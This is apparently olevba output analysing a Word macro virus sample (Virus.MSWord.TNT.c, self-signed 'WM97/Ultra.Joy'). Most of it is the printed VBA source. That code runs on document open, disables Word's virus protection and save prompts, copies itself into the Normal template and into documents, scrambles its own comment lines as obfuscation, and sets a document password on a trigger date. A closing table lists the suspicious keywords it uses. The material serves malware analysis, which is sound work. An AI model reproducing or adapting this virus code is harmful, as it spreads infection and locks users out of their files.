olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.TNT.c-00b324a36a4d89e7c1cabb540b06766c05b1e56a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.TNT.c-00b324a36a4d89e7c1cabb540b06766c05b1e56a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'78<$!!H5<. 4-B$$!!H5<4-B$$78<$!
Dim rsx, rox, xix, xxi As Integer: Dim xxe, xex, exx, exd, cxi, cix, xic, eox, xoe, oxe, cii, rxe, rex, exr, nix, ixn, nxi, lnr, nrl, rnl As String
'79@$"%H6@.!4-B$$"%H6@4-B$$79@$"
Randomize
'69;#" G6;-!4-B$#" G6;4-B$#69;#"
On Error GoTo 79
'7;<$$!H8<.#4-B$$$!H8<4-B$$7;<$$
Options.VirusProtection = Chr(48)
'=8;*! N5;4 4-B$*! N5;4-B$*=8;*!
Options.SaveNormalPrompt = Chr(48)
';9B("'L6B2!4-B$("'L6B4-B$(;9B("
Options.ConfirmConversions = Chr(48)
'79<$"!H6<.!4-B$$"!H6<4-B$$79<$"
rt = ActiveDocument.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
'8;?%$$I8?/#4-B$%$$I8?4-B$%8;?%$
dt = NormalTemplate.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
'6<:#%G9:-$4-B$#%G9:4-B$#6<:#%
If dt > 0 And rt > 0 Then GoTo 79
'9:@&#%J7@0"4-B$&#%J7@4-B$&9:@&#
If dt = 0 Then
'7:;$# H7;."4-B$$# H7;4-B$$7:;$#
    Set Joy = NormalTemplate.VBProject.VBComponents
'88<%!!I5</ 4-B$%!!I5<4-B$%88<%!
    Set hst = ActiveDocument.VBProject.VBComponents
'68@#!%G5@- 4-B$#!%G5@4-B$#68@#!
    If Month(Now()) = 10 And Day(Now()) = 23 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)
'68:#!G5:- 4-B$#!G5:4-B$#68:#!
    If Month(Now()) = 11 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(74) + Chr(79) + Chr(89)
'6:;## G7;-"4-B$## G7;4-B$#6:;##
    If Month(Now()) = 12 And Day(Now()) = 25 Then Application.ActiveDocument.Password = "Ultra.Joy"
'6;:#$G8:-#4-B$#$G8:4-B$#6;:#$
    hst.Item(Abs(1)).Name = Joy.Item(Abs(1)).Name
'89>%"#I6>/!4-B$%"#I6>4-B$%89>%"
    hst.Item(Abs(1)).Export Application.StartupPath & System.Version & Chr(74) + Chr(79) + Chr(89)
'69>#"#G6>-!4-B$#"#G6>4-B$#69>#"
End If
':::'#K7:1"4-B$'#K7:4-B$':::'#
If rt = 0 Then Set Joy = ActiveDocument.VBProject.VBComponents
':<A'%&K9A1$4-B$'%&K9A4-B$':<A'%
Joy.Item(Abs(1)).codemodule.AddFromFile Application.StartupPath & System.Version & Chr(74) + Chr(79) + Chr(89)
'68>#!#G5>- 4-B$#!#G5>4-B$#68>#!
With Joy.Item(Abs(1)).codemodule
'7:;$# H7;."4-B$$# H7;4-B$$7:;$#
    For j = Chr(49) To Chr(52)
'68;#! G5;- 4-B$#! G5;4-B$#68;#!
    .deletelines Chr(49)
'68;#! G5;- 4-B$#! G5;4-B$#68;#!
    Next j
'9:<&#!J7<0"4-B$&#!J7<4-B$&9:<&#
    End With
'69;#" G6;-!4-B$#" G6;4-B$#69;#"
If dt = 0 Then Joy.Item(Abs(1)).codemodule.replaceline 1, "Sub AutoClose()"
'69;#" G6;-!4-B$#" G6;4-B$#69;#"
If dt = 0 Then Joy.Item(Abs(1)).codemodule.replaceline 85, "Sub ToolsMarco()"
'6;=#$"G8=-#4-B$#$"G8=4-B$#6;=#$
If dt = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'7:;$# H7;."4-B$$# H7;4-B$$7:;$#
With Joy.Item(Abs(1)).codemodule
':?<'(!K<<1'4-B$'(!K<<4-B$':?<'(
   For j = Chr(50) To Joy.Item(Abs(1)).codemodule.countoflines Step Chr(50)
';?;(( L<;2'4-B$(( L<;4-B$(;?;((
    rsx = Int(Rnd(11) * 2998) + 24: rox = Int(Rnd(15) * 5863) + 33: xix = Int(Rnd(44) * 3544) + 55
'=8<*!!N5<4 4-B$*!!N5<4-B$*=8<*!
    cii = Asc(rsx): eox = Chr$(cii + 5): xoe = Chr$(cii - 14): oxe = Chr$(cii + 22): lnr = Chr$(cii - 4)
'7;:$$H8:.#4-B$$$H8:4-B$$7;:$$
    cix = Asc(rox): rxe = Chr$(cix + 7): rex = Chr$(cix - 16): exr = Chr$(cix + 4): nrl = Chr$(cix - 17)
';::(#L7:2"4-B$(#L7:4-B$(;::(#
    xic = Asc(xix): nix = Chr$(xic + 9): ixn = Chr$(xic - 18): nxi = Chr$(xic + 8): rnl = Chr$(xic - 33)
'6:<##!G7<-"4-B$##!G7<4-B$#6:<##
    cxi = Asc(xxi): xxe = Chr$(cxi + 4): xex = Chr$(cxi - 3): exx = Chr$(cxi + 18): exd = Chr$(cxi - 12)
'68<#!!G5<- 4-B$#!!G5<4-B$#68<#!
    .replaceline j, Chr(39) & eox & rxe & nix & xoe & rex & ixn & oxe & exr & nix & lnr & nrl & rnl & xxe & xex & exx & exd & xoe & rex & ixn & oxe & exr & nix & rnl & xxe & xex & exx & exd & xoe & eox & rxe & nix & xoe & rex
'6;>#$#G8>-#4-B$#$#G8>4-B$#6;>#$
   Next j
';9;(" L6;2!4-B$(" L6;4-B$(;9;("
End With
'<>A)'&M;A3&4-B$)'&M;A4-B$)<>A)'
79:
'7@;$) H=;.(4-B$$) H=;4-B$$7@;$)
If dt <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'7;<$$!H8<.#4-B$$$!H8<4-B$$7;<$$
End Sub
'79<$"!H6<.!4-B$$"!H6<4-B$$79<$"
Sub ViewVBCode() 'WM97/Ultra.Joy by Virus :) Smile
'68;#! G5;- 4-B$#! G5;4-B$#68;#!
End Sub
'<9;)" M6;3!4-B$)" M6;4-B$)<9;)"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

